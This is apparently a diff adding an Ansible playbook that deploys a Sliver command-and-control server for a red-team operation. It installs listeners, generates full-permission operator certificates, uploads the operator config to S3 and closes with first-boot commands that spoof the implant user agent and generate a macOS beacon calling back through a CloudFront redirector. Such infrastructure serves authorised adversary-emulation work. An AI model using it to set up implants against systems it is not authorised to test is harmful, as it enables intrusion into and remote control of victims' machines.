@@ -1,0 +1,218 @@
+---
+- name: C2 Server Setup (Sliver)
+  hosts: c2_servers
+  become: true
+  gather_facts: true
+
+  tasks:
+    - name: C2 server acknowledgement
+      ansible.builtin.debug:
+        msg:
+          - "C2 Server connection established"
+          - "Instance: {{ inventory_hostname }}"
+          - "Private IP: {{ ansible_facts['default_ipv4']['address'] | default('N/A') }}"
+
+    - name: Install required system packages
+      ansible.builtin.apt:
+        name: "{{ c2_minimal_packages }}"
+        state: present
+        update_cache: true
+
+    # === Download Sliver binaries from GitHub releases ===
+
+    - name: Get latest Sliver release metadata
+      ansible.builtin.uri:
+        url: "https://api.github.com/repos/BishopFox/sliver/releases/latest"
+        method: GET
+        headers:
+          User-Agent: "Ansible"
+        return_content: true
+      register: sliver_release
+      retries: 3
+      delay: 5
+      until: sliver_release is succeeded and (sliver_release.status | default(0)) == 200
+
+    - name: Set Sliver version fact
+      ansible.builtin.set_fact:
+        sliver_version: "{{ sliver_release.json.tag_name }}"
+
+    - name: Set architecture fact
+      ansible.builtin.set_fact:
+        sliver_arch: "{{ 'arm64' if ansible_architecture == 'aarch64' else 'amd64' }}"
+
+    - name: Download sliver-server binary
+      ansible.builtin.get_url:
+        url: "https://github.com/BishopFox/sliver/releases/download/{{ sliver_version }}/sliver-server_linux-{{ sliver_arch }}"
+        dest: /usr/local/bin/sliver-server
+        mode: '0755'
+      register: sliver_server_dl
+      retries: 3
+      delay: 10
+      until: sliver_server_dl is succeeded
+
+    - name: Download sliver-client binary
+      ansible.builtin.get_url:
+        url: "https://github.com/BishopFox/sliver/releases/download/{{ sliver_version }}/sliver-client_linux-{{ sliver_arch }}"
+        dest: /usr/local/bin/sliver-client
+        mode: '0755'
+      register: sliver_client_dl
+      retries: 3
+      delay: 10
+      until: sliver_client_dl is succeeded
+
+    # === Prepare Sliver data directory ===
+
+    - name: Create Sliver data directory
+      ansible.builtin.file:
+        path: "{{ c2_install_dir }}"
+        state: directory
+        owner: root
+        group: root
+        mode: '0700'
+
+    - name: Set SLIVER_ROOT_DIR for all sessions
+      ansible.builtin.lineinfile:
+        path: /etc/environment
+        regexp: '^SLIVER_ROOT_DIR='
+        line: "SLIVER_ROOT_DIR={{ c2_install_dir }}"
+        create: true
+        mode: '0644'
+
+    # === Pre-generate operator certificates ===
+    # Must happen before daemon starts to avoid DB contention on first run.
+
+    - name: Generate deploy-bot operator cert for local administration
+      ansible.builtin.command: >
+        /usr/local/bin/sliver-server operator
+          --name deploy-bot
+          --lhost 127.0.0.1
+          --permissions all
+          --save /tmp
+      environment:
+        SLIVER_ROOT_DIR: "{{ c2_install_dir }}"
+      no_log: true
+
+    - name: Create root Sliver client configuration directory
+      ansible.builtin.file:
+        path: /root/.sliver-client/configs
+        state: directory
+        owner: root
+        group: root
+        mode: '0700'
+
+    - name: Install localhost configuration for the root Sliver client
+      ansible.builtin.copy:
+        src: /tmp/deploy-bot_127.0.0.1.cfg
+        dest: /root/.sliver-client/configs/deploy-bot.cfg
+        remote_src: true
+        owner: root
+        group: root
+        mode: '0600'
+      no_log: true
+
+    - name: Generate operator cert (reachable via VPN at C2 private IP)
+      ansible.builtin.command: >
+        /usr/local/bin/sliver-server operator
+          --name operator
+          --lhost {{ c2_private_ip }}
+          --permissions all
+          --save /tmp
+      environment:
+        SLIVER_ROOT_DIR: "{{ c2_install_dir }}"
+      no_log: true
+
+    # === Unpack embedded assets (Go toolchain, Zig cross-compiler, encoders) ===
+    # This step downloads ~1 GB of toolchain data on first run; allow up to 30 min.
+
+    - name: Unpack Sliver embedded assets
+      ansible.builtin.command: /usr/local/bin/sliver-server unpack --force
+      environment:
+        SLIVER_ROOT_DIR: "{{ c2_install_dir }}"
+      register: sliver_unpack
+      changed_when: true
+      async: 1800
+      poll: 30
+
+    # === Install and start systemd service ===
+
+    - name: Deploy sliver-server systemd unit
+      ansible.builtin.template:
+        src: sliver-server.service.j2
+        dest: /etc/systemd/system/sliver-server.service
+        owner: root
+        group: root
+        mode: '0644'
+
+    - name: Enable and start sliver-server
+      ansible.builtin.systemd:
+        name: sliver-server
+        enabled: true
+        state: started
+        daemon_reload: true
+
+    - name: Wait for Sliver operator port to be ready
+      ansible.builtin.wait_for:
+        host: 127.0.0.1
+        port: "{{ c2_operator_port }}"
+        delay: 5
+        timeout: 120
+        state: started
+
+    # === Install jq (operator uses it during first-boot C2 profile setup) ===
+
+    - name: Install jq
+      ansible.builtin.apt:
+        name: jq
+        state: present
+
+    # === Upload operator config to S3 ===
+
+    - name: Upload operator config to S3
+      ansible.builtin.command: >
+        aws s3 cp /tmp/operator_{{ c2_private_ip }}.cfg
+        s3://{{ s3_bucket_name }}/sliver/operator-{{ operation_name }}.cfg
+      environment:
+        AWS_DEFAULT_REGION: "{{ lookup('env', 'AWS_DEFAULT_REGION') }}"
+      register: s3_upload
+      changed_when: s3_upload.rc == 0
+      no_log: true
+
+    # === Cleanup temp files ===
+
+    - name: Remove temp cert files
+      ansible.builtin.file:
+        path: "{{ item }}"
+        state: absent
+      loop:
+        - /tmp/deploy-bot_127.0.0.1.cfg
+        - "/tmp/operator_{{ c2_private_ip }}.cfg"
+      # The localhost config has been installed; the remote config has been uploaded to S3.
+
+    # === Summary ===
+
+    - name: Generate Sliver deployment summary
+      ansible.builtin.debug:
+        msg:
+          - "C2 (Sliver) — Deployment Complete"
+          - ""
+          - "  Version:         {{ sliver_version }} ({{ sliver_arch }})"
+          - "  Install dir:     {{ c2_install_dir }}"
+          - "  Operator port:   {{ c2_private_ip }}:{{ c2_operator_port }} (VPN only)"
+          - "  HTTP C2 port:    0.0.0.0:{{ c2_http_port }} (proxied via redirector)"
+          - "  mTLS port:       {{ c2_private_ip }}:{{ c2_mtls_port }} (VPN only)"
+          - ""
+          - "  Operator config: s3://{{ s3_bucket_name }}/sliver/operator-{{ operation_name }}.cfg"
+          - ""
+          - "*** FIRST BOOT — run once (listeners + profile persist to SQLite forever after): ***"
+          - ""
+          - "  1. SSM into C2: aws ssm start-session --target {{ inventory_hostname }}"
+          - "  2. sudo sliver-client"
+          - "       http --lhost 0.0.0.0 --lport {{ c2_http_port }}"
+          - "       mtls --lhost 0.0.0.0 --lport {{ c2_mtls_port }}"
+          - "       c2profiles export -n default -f /tmp/default.json"
+          - "       exit"
+          - "  3. jq '.implant_config.user_agent = \"{{ c2_implant_ua }}\"' /tmp/default.json > /tmp/straylight.json"
+          - "  4. sudo sliver-client"
+          - "       c2profiles import -n {{ c2_sliver_profile_name }} -f /tmp/straylight.json"
+          - "       generate beacon --http <cloudfront-url> --c2profile {{ c2_sliver_profile_name }} --os darwin --arch arm64 --save /tmp/BEACON"
+          - "       exit"
